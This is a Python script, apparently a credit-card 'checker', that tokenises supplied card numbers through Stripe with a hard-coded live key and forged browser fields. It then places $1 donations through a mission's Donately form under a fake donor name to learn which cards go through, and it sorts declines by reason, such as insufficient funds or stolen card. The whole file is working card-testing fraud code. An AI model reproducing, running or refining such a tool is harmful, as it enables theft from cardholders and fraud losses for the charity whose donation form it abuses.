import requests
import random
import json
import logging
import time

class StripeChecker:
    def __init__(self):
        self.pk_live = 'pk_live_51MJjGSR9GTt0CcXJYNHenVaATXNyK43YPRgUBgoRQDtrLCnk7YZ8OL7uhrQF3BJAs8vT8dPoKjORWC9JlwSwRiKs00QjcCzQMX'
        self.account_id = 'act_f9b102ae7299'
        self.form_id = 'frm_5cb29a5d6955'
        self.logger = logging.getLogger(__name__)

    def generate_guid(self):
        return '{:04x}{:04x}-{:04x}-{:04x}-{:04x}-{:04x}{:04x}{:04x}'.format(
            random.randint(0, 0xffff), random.randint(0, 0xffff), random.randint(0, 0xffff),
            random.randint(0, 0x0fff) | 0x4000,
            random.randint(0, 0x3fff) | 0x8000,
            random.randint(0, 0xffff), random.randint(0, 0xffff), random.randint(0, 0xffff)
        )

    def generate_token(self, card_data):
        post_fields = {
            'card[number]': card_data['cc'],
            'card[cvc]': card_data['cvv'],
            'card[exp_month]': card_data['month'],
            'card[exp_year]': card_data['year'],
            'card[name]': card_data['name'],
            'card[address_country]': 'US',
            'card[currency]': 'USD',
            'guid': self.generate_guid(),
            'muid': self.generate_guid(),
            'sid': self.generate_guid(),
            'payment_user_agent': 'stripe.js/d72854d2f1; stripe-js-v3/d72854d2f1; card-element',
            'time_on_page': random.randint(20000, 50000),
            'key': self.pk_live,
            '_stripe_version': '2022-11-15'
        }

        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }

        for attempt in range(3):  # Retry logic with exponential backoff
            try:
                response = requests.post('https://api.stripe.com/v1/tokens', data=post_fields, headers=headers)
                response.raise_for_status()
                return response.json()
            except requests.RequestException as e:
                self.logger.error(f"Attempt {attempt + 1} failed: {e}")
                time.sleep(2 ** attempt)  # Exponential backoff

        return {'error': {'message': 'Failed to generate token after multiple attempts'}}

    def charge_card(self, token, user_data):
        payload = {
            'campaign_id': None,
            'fundraiser_id': None,
            'dont_send_receipt_email': False,
            'first_name': user_data['first_name'],
            'last_name': user_data['last_name'],
            'email': user_data['email'],
            'currency': 'USD',
            'recurring': False,
            'country': 'US',
            'payment_auth': json.dumps({'stripe_token': token}),
            'form': json.dumps({
                'version': '5.8.117',
                'id': self.form_id
            })
        }

        url = "https://api.donately.com/v2/donations?" + '&'.join([
            'account_id=' + self.account_id,
            'donation_type=cc',
            'amount_in_cents=100',
            'form_id=' + self.form_id,
            'x1=' + self.generate_guid()
        ])

        headers = {
            'Accept': '*/*',
            'Content-Type': 'application/json; charset=UTF-8',
            'Donately-Version': '2022-12-15',
            'Origin': 'https://www-christwaymission-com.filesusr.com',
            'Referer': 'https://www-christwaymission-com.filesusr.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }

        for attempt in range(3):  # Retry logic with exponential backoff
            try:
                response = requests.post(url, json=payload, headers=headers)
                response.raise_for_status()
                return response.json()
            except requests.RequestException as e:
                self.logger.error(f"Attempt {attempt + 1} failed: {e}")
                time.sleep(2 ** attempt)  # Exponential backoff

        return {'type': 'bad_request', 'message': 'Failed to charge card after multiple attempts'}

    def process_card(self, cc, month, year, cvv):
        user_data = {
            'first_name': 'Richard',
            'last_name': 'Biven',
            'email': 'test{}@gmail.com'.format(random.randint(1000, 9999))
        }

        token_response = self.generate_token({
            'cc': cc,
            'month': month,
            'year': year,
            'cvv': cvv,
            'name': user_data['first_name'] + ' ' + user_data['last_name']
        })

        if 'id' not in token_response:
            error_obj = token_response.get('error', {})
            error_message = error_obj.get('message', 'Unknown error')
            error_code = error_obj.get('code', '')
            error_decline_code = error_obj.get('decline_code', '')
            
            # Get detailed reason for the decline
            detailed_reason = self.get_decline_reason(error_code, error_decline_code, error_message)
            self.logger.error(f"Token generation failed: {detailed_reason}")
            
            return {
                'success': False,
                'message': 'Card verification failed',
                'error': error_message,
                'reason': detailed_reason,
                'code': error_code,
                'decline_code': error_decline_code
            }

        charge_response = self.charge_card(token_response['id'], user_data)
        
        # Check for errors in charge response
        if 'type' in charge_response and charge_response['type'] == 'bad_request':
            error_message = charge_response.get('message', 'Transaction failed')
            error_code = charge_response.get('code', '')
            decline_code = charge_response.get('decline_code', '')
            
            # Check if this might be an insufficient funds issue based on message
            reason = self.get_decline_reason(error_code, decline_code, error_message)
            
            # Explicitly check for insufficient funds in message
            if 'insufficient' in error_message.lower() or 'insufficient' in reason.lower():
                decline_code = 'insufficient_funds'
                reason = self.get_decline_reason('insufficient_funds', decline_code, error_message)
            
            self.logger.error(f"Charge failed: {reason}")
            return {
                'success': False,
                'message': 'Card was declined',
                'error': error_message,
                'reason': reason,
                'code': error_code,
                'decline_code': decline_code,
                'response': {
                    'type': 'error',
                    'message': error_message if error_message else 'Card was declined.',
                    'code': error_code if error_code else '400',
                    'decline_code': decline_code if decline_code else ''
                }
            }

        # Check if there was a successful response with an ID
        if isinstance(charge_response, dict) and 'id' in charge_response:
            self.logger.info("Transaction successful")
            # Format the response according to the requested structure
            return {
                'success': True,
                'message': 'Transaction successful',
                'response': {
                    'type': 'success',
                    'message': 'Card charge was successful.',
                    'code': '200',
                    'id': charge_response.get('id', ''),
                    'status': 'Approved',
                    'amount': '1.00',
                    'currency': 'USD'
                }
            }
        else:
            # Handle case where we got a response but no ID (failed transaction)
            error_message = charge_response.get('message', 'Transaction failed')
            self.logger.error(f"Charge failed: {error_message}")
            return {
                'success': False,
                'message': 'Card was declined',
                'error': error_message,
                'reason': 'API Error: ' + error_message,
                'code': 'api_error',
                'response': {
                    'type': 'error',
                    'message': error_message,
                    'code': '400'
                }
            }
    
    def get_decline_reason(self, error_code, decline_code, default_message):
        """Return a user-friendly explanation based on error codes"""
        
        decline_reasons = {
            # Common Stripe decline codes
            'card_declined': 'The card was declined by the issuer',
            'expired_card': 'The card has expired',
            'incorrect_cvc': 'The security code (CVV) is incorrect',
            'incorrect_number': 'The card number is incorrect',
            'invalid_expiry_month': 'The expiration month is invalid',
            'invalid_expiry_year': 'The expiration year is invalid',
            'invalid_number': 'The card number is invalid',
            'processing_error': 'An error occurred while processing the card',
            'insufficient_funds': 'The card has insufficient funds',
            'lost_card': 'The card has been reported lost',
            'stolen_card': 'The card has been reported stolen',
            'fraudulent': 'The payment has been declined as fraudulent',
            'not_permitted': 'The payment is not permitted',
            'try_again_later': 'Temporary issue - try again later',
            'withdrawal_count_limit_exceeded': 'Card withdrawal count limit exceeded',
            'currency_not_supported': 'The card does not support this currency',
            'testmode_decline': 'Test mode decline (test cards only)',
        }
        
        # Check decline_code first, then error_code
        if decline_code and decline_code in decline_reasons:
            return decline_reasons[decline_code]
        elif error_code and error_code in decline_reasons:
            return decline_reasons[error_code]
        else:
            return default_message